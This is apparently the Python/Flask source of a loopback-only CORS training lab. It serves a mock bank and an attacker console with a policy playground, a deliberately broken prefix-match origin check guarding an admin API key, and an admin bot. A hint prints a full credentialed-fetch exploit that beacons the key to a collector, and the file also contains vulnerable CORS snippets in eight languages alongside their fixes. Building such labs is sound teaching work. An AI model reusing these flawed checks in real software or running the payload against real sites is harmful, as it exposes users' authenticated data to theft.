"""
WildWebApps protection lab - Cross-Origin Resource Sharing (CORS).

CORS is real here, not simulated: the browser itself decides, from the server's
`Access-Control-*` headers, whether a cross-origin script may READ a response. This
lab lets you probe every CORS policy in a real browser, then exploits the one broken
origin check that hands an authenticated response to an attacker.

Two origins, one host, split by PORT
-------------------------------------
CORS only means something across origins, so this single app answers on two of them:

  * the BANK (victim app) at     http://127.0.0.1:8000   - the admin is logged in here
  * the ATTACKER console at       http://127.0.0.1:8001   - where you host the exploit

`127.0.0.1:8000` and `127.0.0.1:8001` are a DIFFERENT ORIGIN (the port differs, and an
origin is scheme + host + port), so the browser applies CORS between them. But they are
the SAME SITE (a "site" ignores the port), so the bank's `SameSite=Lax` session cookie
still rides a credentialed cross-origin request from the console to the bank. No brittle
`SameSite=None; Secure` cookie is needed, and everything stays on loopback / offline.

The policy playground (see and probe every CORS policy)
-------------------------------------------------------
The bank exposes one endpoint per policy. From the console you fire a cross-origin read
at each, with credentials on or off, and watch which reads the browser permits:

  * /api/no-cors    - no CORS headers. The read is BLOCKED (Same-Origin Policy default).
  * /api/wildcard   - Access-Control-Allow-Origin: *. An anonymous read is ALLOWED, but a
                      credentialed read is BLOCKED (the wildcard-plus-credentials rule).
  * /api/exact      - Allow-Origin names a fixed PARTNER origin that is not your console,
                      so your read is BLOCKED. An exact allowlist working.
  * /api/preflight  - requires a custom header, so the browser sends an OPTIONS preflight
                      first; the response carries Allow-Methods / Allow-Headers / Max-Age
                      and the GET exposes a header via Expose-Headers. Echoes the console
                      origin EXACTLY (the correct credentialed pattern).
  * /api/null-origin- trusts the literal `null` origin with credentials; a sandboxed
                      iframe (whose origin is null) can read it. A misconfiguration.

The challenge (the broken check that leaks the key)
---------------------------------------------------
  * /api/profile    - holds the admin's API key (the flag). The bank means to share it
                      only with its own loopback tools, but validates the Origin with a
                      PREFIX MATCH THAT IGNORES THE PORT (`Origin.startswith(
                      "http://127.0.0.1")`), so it wrongly trusts your console origin too,
                      reflects it into Access-Control-Allow-Origin, and allows credentials.
                      With the admin session attached it returns the key.

How the flag is gated behind exploitation
-----------------------------------------
The API key only exists in the admin's session, and that cookie lives only in the admin
bot's browser, never yours. A credentialed read of /api/profile from the console is
permitted by the broken check, but with no admin session it returns no key. To win you
must:

  1. write an exploit page that does a credentialed cross-origin fetch to /api/profile,
     reads api_key, and beacons it to your collector (/collect),
  2. deliver it to the logged-in admin bot (POST /deliver). Its browser attaches the
     admin cookie, the broken check lets your script read the response, and the key lands
     in your collector,
  3. read the captured key and submit it as the flag.

The admin bot is a headless Chromium driven by Playwright. It only ever browses 127.0.0.1.
"""
import os
import threading
import time

from flask import (
    Flask, render_template, request, jsonify, redirect, url_for, Response,
)

import vulnlab

app = Flask(__name__)

# Fresh random MD5 flag for this process (rotates on every restart). It is the admin
# account's API key, leaked through the broken CORS origin check on /api/profile.
FLAG = vulnlab.generate_flag()

BANK_PORT = int(os.environ.get("BANK_PORT", "8000"))
ATTACKER_PORT = int(os.environ.get("ATTACKER_PORT", "8001"))
BANK_ORIGIN = f"http://127.0.0.1:{BANK_PORT}"          # victim app (admin logged in here)
ATTACKER_ORIGIN = f"http://127.0.0.1:{ATTACKER_PORT}"  # attacker console / exploit host

# A fixed third-party origin the /api/exact endpoint trusts. It is deliberately NOT the
# console, so an exact-match allowlist refuses the console's read (the demo of CORS done
# right). Nothing needs to run there; the browser only compares it against the caller.
PARTNER_ORIGIN = "https://partner.example"

# Per-process admin session token. The admin bot's browser carries it as a cookie; the
# attacker never sees it (it is HttpOnly) and does not need to, the browser attaches it
# automatically to the credentialed cross-origin fetch. Distinct from the flag, so even
# reading the cookie would not hand over the key.
ADMIN_SESSION = vulnlab.generate_flag()

# A scaffold shown in the console textarea. It is deliberately NOT a working exploit:
# completing it (a credentialed cross-origin read of /api/profile that beacons the key)
# is the exercise. The hints contain a full example.
DEFAULT_EXPLOIT = """<!-- CORS exploit (hosted on your console origin, 127.0.0.1:8001).
     Target:  http://127.0.0.1:8000/api/profile
     Its broken origin check (prefix match, ignores the port) trusts this console, so a
     credentialed cross-origin read is allowed. Read api_key and beacon it to /collect.
     See the hints for a complete example. -->
<html>
  <body>
    <script>
      // TODO: fetch the bank's /api/profile with credentials, then send api_key to /collect
    </script>
  </body>
</html>
"""

# Mutable lab state (resets to defaults on restart).
LOOT: list[dict] = []
LOOT_MAX = 50
STATE = {
    "done": False,               # True once a correct key is captured
    "exploit": DEFAULT_EXPLOIT,  # attacker-authored HTML served at /exploit
}

# 1x1 transparent GIF, so `new Image().src=...` beacons cleanly.
GIF = (b"GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00!"
       b"\xf9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01"
       b"\x00\x00\x02\x02D\x01\x00;")


def site() -> str:
    """Which origin is addressed: 'attacker' (port 8001) or 'bank' (port 8000)."""
    host = request.host or ""
    port = host.rsplit(":", 1)[-1] if ":" in host else ""
    return "attacker" if port == str(ATTACKER_PORT) else "bank"


def _signed_in() -> bool:
    return request.cookies.get("session") == ADMIN_SESSION


# -- The admin victim ---------------------------------------------------------
def admin_visit(url: str) -> str:
    """
    Open `url` in a headless browser that is "logged in" to the BANK as the admin (its
    context carries the bank session cookie, scoped to host 127.0.0.1 so it is sent to
    both ports). If the page reads the bank cross-origin through the broken CORS check,
    the browser attaches that cookie. Returns "" on success or a short error.
    """
    try:
        from playwright.sync_api import sync_playwright
    except Exception as exc:  # Playwright missing - only happens outside the image
        return f"admin browser unavailable: {exc}"

    try:
        with sync_playwright() as p:
            browser = p.chromium.launch(
                args=["--no-sandbox", "--disable-dev-shm-usage"]
            )
            try:
                ctx = browser.new_context()
                # The admin's logged-in session at the BANK. The cookie is host-scoped to
                # 127.0.0.1 (cookies ignore the port), so it is also sent on the
                # credentialed cross-origin fetch from :8001 to :8000. SameSite=Lax is
                # enough because :8001 and :8000 are the SAME SITE. HttpOnly keeps it out
                # of document.cookie, so the read must go through the response body (the
                # CORS hole), not a cookie shortcut.
                ctx.add_cookies([{
                    "name": "session",
                    "value": ADMIN_SESSION,
                    "url": BANK_ORIGIN,
                    "httpOnly": True,
                    "sameSite": "Lax",
                }])
                page = ctx.new_page()
                page.goto(url, wait_until="load", timeout=8000)
                page.wait_for_timeout(1500)  # let the fetch + beacon complete
            finally:
                browser.close()
        return ""
    except Exception as exc:
        return f"admin visit failed: {exc}"


# -- In-lab code switcher: broken origin check (Dangerous) vs exact allowlist (Safe) --
# The CORS grant is only as strong as the origin check. "Dangerous" reflects the origin
# or matches it with a prefix / suffix / substring test an attacker can satisfy; "Safe"
# is exact membership in an explicit allowlist (plus Vary: Origin).
LANGUAGES = {
    "Python": {
        "vuln": (
            "# DANGEROUS: a prefix test, so https://app.example.com.evil.net (and any\n"
            "# port on a trusted host) passes the check.\n"
            "origin = request.headers.get('Origin', '')\n"
            "if origin.startswith('https://app.example.com'):\n"
            "    resp.headers['Access-Control-Allow-Origin'] = origin\n"
            "    resp.headers['Access-Control-Allow-Credentials'] = 'true'"
        ),
        "fixed": (
            "from flask_cors import CORS\n"
            "# SAFE: exact allowlist; only these origins read credentialed responses.\n"
            "CORS(app, resources={r'/api/*': {'origins': ['https://app.example.com']}},\n"
            "     supports_credentials=True)   # adds Vary: Origin for you"
        ),
        "doc": "https://flask-cors.readthedocs.io/en/latest/",
    },
    "JavaScript": {
        "vuln": (
            "// DANGEROUS: a suffix test, so https://evil-app.example.com passes.\n"
            "app.use(cors({\n"
            "  origin: (o, cb) => cb(null, !o || o.endsWith('app.example.com')),\n"
            "  credentials: true,\n"
            "}));"
        ),
        "fixed": (
            "const ALLOW = new Set(['https://app.example.com']);\n"
            "app.use(cors({\n"
            "  origin: (o, cb) => cb(null, !o || ALLOW.has(o)),  // exact membership\n"
            "  credentials: true,\n"
            "}));"
        ),
        "doc": "https://expressjs.com/en/resources/middleware/cors.html",
    },
    "TypeScript": {
        "vuln": (
            "// DANGEROUS: substring test, so https://app.example.com.attacker.net passes.\n"
            "app.use(cors({\n"
            "  origin: (o, cb) => cb(null, !o || o.includes('app.example.com')),\n"
            "  credentials: true,\n"
            "}));"
        ),
        "fixed": (
            "import cors, { CorsOptions } from 'cors';\n"
            "const allow = new Set(['https://app.example.com']);\n"
            "const opts: CorsOptions = {\n"
            "  origin: (o, cb) => cb(null, !o || allow.has(o)), credentials: true,\n"
            "};\n"
            "app.use(cors(opts));"
        ),
        "doc": "https://expressjs.com/en/resources/middleware/cors.html",
    },
    "PHP": {
        "vuln": (
            "// DANGEROUS: reflects whatever Origin arrives, with credentials.\n"
            "header('Access-Control-Allow-Origin: ' . ($_SERVER['HTTP_ORIGIN'] ?? ''));\n"
            "header('Access-Control-Allow-Credentials: true');"
        ),
        "fixed": (
            "$allow = ['https://app.example.com'];           // exact allowlist\n"
            "$o = $_SERVER['HTTP_ORIGIN'] ?? '';\n"
            "if (in_array($o, $allow, true)) {\n"
            "    header(\"Access-Control-Allow-Origin: $o\");\n"
            "    header('Access-Control-Allow-Credentials: true');\n"
            "    header('Vary: Origin');\n"
            "}"
        ),
        "doc": "https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CORS",
    },
    "Java": {
        "vuln": (
            "// DANGEROUS: a wildcard pattern reflects the Origin, with credentials.\n"
            "config.addAllowedOriginPattern(\"https://*.example.com\");\n"
            "config.setAllowCredentials(true);"
        ),
        "fixed": (
            "// SAFE: explicit, fully qualified origins; credentials only for those.\n"
            "config.setAllowedOrigins(List.of(\"https://app.example.com\"));\n"
            "config.setAllowCredentials(true);"
        ),
        "doc": "https://docs.spring.io/spring-framework/reference/web/webmvc-cors.html",
    },
    "Ruby": {
        "vuln": (
            "# DANGEROUS: an unanchored regex matches app.example.com.attacker.net.\n"
            "allow do\n"
            "  origins(/app\\.example\\.com/)\n"
            "  resource '*', headers: :any, credentials: true\n"
            "end"
        ),
        "fixed": (
            "allow do\n"
            "  origins 'https://app.example.com'        # exact string, allowlist\n"
            "  resource '/api/*', headers: :any, credentials: true\n"
            "end"
        ),
        "doc": "https://github.com/cyu/rack-cors",
    },
    "Go": {
        "vuln": (
            "// DANGEROUS: HasPrefix lets https://app.example.com.evil.net through.\n"
            "c := cors.New(cors.Options{\n"
            "    AllowOriginFunc:  func(o string) bool {\n"
            "        return strings.HasPrefix(o, \"https://app.example.com\") },\n"
            "    AllowCredentials: true,\n"
            "})"
        ),
        "fixed": (
            "c := cors.New(cors.Options{\n"
            "    AllowedOrigins:   []string{\"https://app.example.com\"},  // exact\n"
            "    AllowCredentials: true,\n"
            "})"
        ),
        "doc": "https://github.com/rs/cors",
    },
    "C#": {
        "vuln": (
            "// DANGEROUS: predicate accepts any origin ending in the domain.\n"
            "policy.SetIsOriginAllowed(o => o.EndsWith(\"example.com\"))\n"
            "      .AllowAnyHeader().AllowCredentials();"
        ),
        "fixed": (
            "policy.WithOrigins(\"https://app.example.com\")   // exact allowlist\n"
            "      .AllowAnyHeader().AllowCredentials();"
        ),
        "doc": "https://learn.microsoft.com/en-us/aspnet/core/security/cors",
    },
}

CONTEXT = vulnlab.lab_context(
    title="Cross-Origin Resource Sharing (CORS) - WildBank",
    owasp="Defense: Cross-Origin Resource Sharing (server-controlled cross-origin access)",
    summary=(
        "WildBank answers on two origins split by port: the bank at :8000 and your "
        "console at :8001. First probe every CORS policy in the playground: fire a "
        "cross-origin read at each endpoint, with credentials on or off, and watch which "
        "reads the browser permits. Then attack: /api/profile holds the admin's API key "
        "and means to trust only the bank's own loopback tools, but validates the Origin "
        "with a prefix match that ignores the port, so it wrongly trusts your console. "
        "You hold no admin session; the logged-in admin bot opens any page you host. "
        "Make the admin's own browser read the key for you through that broken check, and "
        "the flag appears."
    ),
    instructions=[
        "Two origins, one host: the bank is http://127.0.0.1:8000 and this console is "
        "http://127.0.0.1:8001. A different port is a different ORIGIN (so CORS applies), "
        "but the same SITE (so the bank's SameSite=Lax cookie still rides a request "
        "between them).",
        "Use the Policy playground below. Probe each endpoint with credentials off, then "
        "on. See no-cors blocked, wildcard allow anon but block credentialed, exact block "
        "your console, preflight do its OPTIONS dance, and null-origin readable only from "
        "a sandboxed iframe.",
        "Now the challenge. /api/profile trusts any Origin that starts with "
        "http://127.0.0.1, so it trusts this console (:8001) by mistake. A credentialed "
        "read is allowed, but with no admin session it returns no key.",
        "Write an exploit that does a credentialed cross-origin fetch to "
        "http://127.0.0.1:8000/api/profile, reads api_key, and beacons it to /collect on "
        "this origin. Store it, then Deliver to admin.",
        "The bot's browser attaches the admin cookie, the broken check lets your script "
        "read the response, and the API key lands in your collector. Submit it as the flag.",
    ],
    hints=[
        "Playground first. /api/no-cors sends no headers, so any cross-origin read is "
        "blocked. /api/wildcard sends Allow-Origin: * (anonymous read works; add "
        "credentials and the browser blocks it: * is invalid with credentials). "
        "/api/exact names https://partner.example, not your console, so your read is "
        "refused. That is an exact allowlist doing its job.",
        "/api/preflight needs the header X-WildBank-Client, which makes the request "
        "non-simple, so the browser sends an OPTIONS preflight first. The response names "
        "the allowed method, header, and Max-Age, and the GET adds Access-Control-Expose-"
        "Headers so your script can read X-WildBank-Quota. /api/null-origin returns "
        "Allow-Origin: null, readable only from a null-origin context (a sandboxed iframe).",
        "Now /api/profile. Its check is Origin.startswith('http://127.0.0.1'), which "
        "trusts http://127.0.0.1:8001 (this console) even though it is a different origin. "
        "Paste this as your exploit, then Store + Deliver to admin:  "
        "<html><body><script>"
        "fetch('http://127.0.0.1:8000/api/profile',{credentials:'include'})"
        ".then(r=>r.json()).then(d=>{new Image().src="
        "'/collect?c='+encodeURIComponent(d.api_key)})"
        "</script></body></html>",
        "Why it works, and the fix: :8001 and :8000 are the same site (host 127.0.0.1), "
        "so the admin's SameSite=Lax cookie rides the credentialed fetch; the broken "
        "prefix check then reflects your origin and allows credentials, so the browser "
        "lets your script read the key. The fix is an exact allowlist: compare the Origin "
        "against an explicit set with a full-string match (including the port), add Vary: "
        "Origin, and never pair credentials with a wildcard, a reflected origin, or null.",
    ],
    languages=LANGUAGES,
    references=[
        ("MDN - Cross-Origin Resource Sharing (CORS)", "https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CORS"),
        ("OWASP - CORS misconfiguration", "https://owasp.org/www-community/attacks/CORS_OriginHeaderScrutiny"),
        ("PortSwigger - CORS", "https://portswigger.net/web-security/cors"),
        ("WHATWG Fetch - CORS protocol", "https://fetch.spec.whatwg.org/#http-cors-protocol"),
    ],
)


# -- Routes -------------------------------------------------------------------
@app.route("/")
def index():
    if site() == "attacker":
        # The attacker console: policy playground, exploit hosting, collector, flag.
        return render_template(
            "index.html",
            bank_url=BANK_ORIGIN,
            console_url=ATTACKER_ORIGIN,
            partner_origin=PARTNER_ORIGIN,
            exploit_html=STATE["exploit"],
            solved=STATE["done"],
            flag=(FLAG if STATE["done"] else ""),
            loot=list(reversed(LOOT)),
            err=request.args.get("err", ""),
            **CONTEXT,
        )
    # The bank (victim app) the admin is logged into.
    return render_template(
        "bank.html",
        signed_in=_signed_in(),
        console_url=ATTACKER_ORIGIN,
        bank_url=BANK_ORIGIN,
        partner_origin=PARTNER_ORIGIN,
    )


# === Policy playground endpoints (one CORS policy each) =======================
@app.get("/api/no-cors")
def api_no_cors():
    # No Access-Control-* headers at all. A cross-origin script cannot read the
    # response: the Same-Origin Policy default. (Same-origin reads still work.)
    if site() != "bank":
        return redirect(BANK_ORIGIN + "/api/no-cors")
    return jsonify(policy="no-cors", account="WildBank Checking", balance="12,480.55 USD")


@app.get("/api/wildcard")
def api_wildcard():
    # Access-Control-Allow-Origin: * with NO credentials. An anonymous cross-origin read
    # is allowed; a credentialed read is blocked by the browser, because '*' is invalid
    # together with credentials. Safe only for genuinely public, non-credentialed data.
    if site() != "bank":
        return redirect(BANK_ORIGIN + "/api/wildcard")
    resp = jsonify(policy="wildcard", tagline="WildBank public rates", apr="4.10%")
    resp.headers["Access-Control-Allow-Origin"] = "*"
    return resp


@app.get("/api/exact")
def api_exact():
    # Exact allowlist: Allow-Origin names ONE fixed partner origin that is not the
    # console, so the browser refuses the console's read. CORS done right (the negative
    # case): an origin you did not name cannot read you. Vary: Origin keeps caches honest.
    if site() != "bank":
        return redirect(BANK_ORIGIN + "/api/exact")
    resp = jsonify(policy="exact", partner=PARTNER_ORIGIN, note="readable only by the named partner")
    resp.headers["Access-Control-Allow-Origin"] = PARTNER_ORIGIN
    resp.headers["Vary"] = "Origin"
    return resp


@app.route("/api/preflight", methods=["GET", "OPTIONS"])
def api_preflight():
    # Requires the custom request header X-WildBank-Client, which makes the request
    # non-simple, so the browser sends an OPTIONS PREFLIGHT first. The preflight response
    # advertises the allowed method, the allowed header, and a Max-Age; the actual GET
    # exposes a custom response header via Access-Control-Expose-Headers. The origin is
    # echoed ONLY when it exactly equals the console. Because that is an EXACT match (not
    # a wildcard, not a reflection), it is safe to also allow credentials, so both the
    # preflight and the GET send Access-Control-Allow-Credentials: true. This makes the
    # endpoint the correct credentialed pattern behind a preflight: the read is allowed
    # whether or not the caller sends credentials. (A credentialed request whose preflight
    # or final response lacks Allow-Credentials would be blocked by the browser, which is
    # why both responses set it.)
    if site() != "bank":
        return redirect(BANK_ORIGIN + "/api/preflight")
    origin = request.headers.get("Origin", "")
    allow = origin if origin == ATTACKER_ORIGIN else ""

    if request.method == "OPTIONS":
        resp = Response(status=204)
        if allow:
            resp.headers["Access-Control-Allow-Origin"] = allow
            resp.headers["Access-Control-Allow-Credentials"] = "true"
            resp.headers["Access-Control-Allow-Methods"] = "GET, OPTIONS"
            resp.headers["Access-Control-Allow-Headers"] = "X-WildBank-Client"
            resp.headers["Access-Control-Max-Age"] = "600"
            resp.headers["Vary"] = "Origin"
        return resp

    resp = jsonify(policy="preflight", quota="4999 calls remaining")
    if allow:
        resp.headers["Access-Control-Allow-Origin"] = allow
        resp.headers["Access-Control-Allow-Credentials"] = "true"
        resp.headers["Access-Control-Expose-Headers"] = "X-WildBank-Quota"
        resp.headers["Vary"] = "Origin"
    resp.headers["X-WildBank-Quota"] = "4999"
    return resp


@app.get("/api/null-origin")
def api_null_origin():
    # === A MISCONFIGURATION =================================================
    # Trusts the LITERAL `null` origin and allows credentials. `null` is the origin of a
    # sandboxed iframe, a data: document, and some redirect chains, so any attacker can
    # produce it. Allow-Origin: null with credentials is therefore readable by an
    # attacker's sandboxed iframe. Returned data here is a harmless demo.
    # ========================================================================
    if site() != "bank":
        return redirect(BANK_ORIGIN + "/api/null-origin")
    resp = jsonify(policy="null-origin", note="this endpoint trusts the null origin", demo=True)
    resp.headers["Access-Control-Allow-Origin"] = "null"
    resp.headers["Access-Control-Allow-Credentials"] = "true"
    resp.headers["Vary"] = "Origin"
    return resp


# === The challenge endpoint ===================================================
@app.get("/api/profile")
def api_profile():
    # === THE BROKEN ORIGIN CHECK ============================================
    # The bank means to trust only its own loopback tools, so it "allowlists localhost"
    # with a PREFIX MATCH:  Origin.startswith("http://127.0.0.1").  That ignores the
    # PORT, so it also trusts http://127.0.0.1:8001 (the attacker console), a different
    # origin. It then reflects the origin into Access-Control-Allow-Origin and allows
    # credentials, which lets that origin read the authenticated response. With the admin
    # session cookie attached it returns the API key (the flag). An exact allowlist
    # (full-string match, including the port) would have refused the console.
    # ========================================================================
    if site() != "bank":
        return redirect(BANK_ORIGIN + "/api/profile")
    signed_in = _signed_in()
    resp = jsonify(
        policy="profile",
        user=("admin" if signed_in else None),
        api_key=(FLAG if signed_in else None),
    )
    origin = request.headers.get("Origin", "")
    if origin.startswith("http://127.0.0.1"):   # BROKEN: prefix match ignores the port
        resp.headers["Access-Control-Allow-Origin"] = origin   # reflected
        resp.headers["Access-Control-Allow-Credentials"] = "true"
        resp.headers["Vary"] = "Origin"
    return resp


# === Attacker console machinery ==============================================
@app.post("/exploit")
def save_exploit():
    """Attacker hosting: store the exploit HTML (served from the console origin)."""
    if site() != "attacker":
        return redirect(ATTACKER_ORIGIN + "/")
    STATE["exploit"] = request.form.get("html", "")
    return redirect(ATTACKER_ORIGIN + "/")


@app.get("/exploit")
def serve_exploit():
    """Serve the attacker's page from the console origin (127.0.0.1:8001)."""
    if site() != "attacker":
        return redirect(ATTACKER_ORIGIN + "/exploit")
    return Response(STATE["exploit"], mimetype="text/html")


@app.post("/deliver")
def deliver():
    """Have the logged-in admin bot open the hosted exploit page."""
    if site() != "attacker":
        return redirect(ATTACKER_ORIGIN + "/")
    err = admin_visit(ATTACKER_ORIGIN + "/exploit")
    return redirect(url_for("index", err=err) if err else url_for("index"))


@app.route("/collect", methods=["GET", "POST"])
def collect():
    """Attacker's collector. The injected script beacons the stolen key here."""
    if site() != "attacker":
        return redirect(ATTACKER_ORIGIN + "/collect")
    data = request.values.get("c", "")
    if data:
        LOOT.append({
            "time": time.strftime("%H:%M:%S"),
            "src": request.remote_addr or "?",
            "data": data,
        })
        del LOOT[:-LOOT_MAX]
        if vulnlab.check_flag(FLAG, data):
            STATE["done"] = True
    return Response(GIF, mimetype="image/gif")


@app.post("/check")
def check():
    if site() != "attacker":
        return redirect(ATTACKER_ORIGIN + "/")
    return jsonify(correct=vulnlab.check_flag(FLAG, request.form.get("flag", "")))


def _run(port: int):
    from werkzeug.serving import make_server
    host = os.environ.get("HOST", "127.0.0.1")
    # threaded=True so the admin bot's inbound requests (the exploit page, the
    # cross-origin /api/profile read, and the /collect beacon) are served while the
    # /deliver request that launched the bot is still open.
    make_server(host, port, app, threaded=True).serve_forever()


if __name__ == "__main__":
    # One Flask app, two origins: serve the attacker console on its port in a background
    # thread and the bank on the main thread.
    threading.Thread(target=_run, args=(ATTACKER_PORT,), daemon=True).start()
    _run(BANK_PORT)
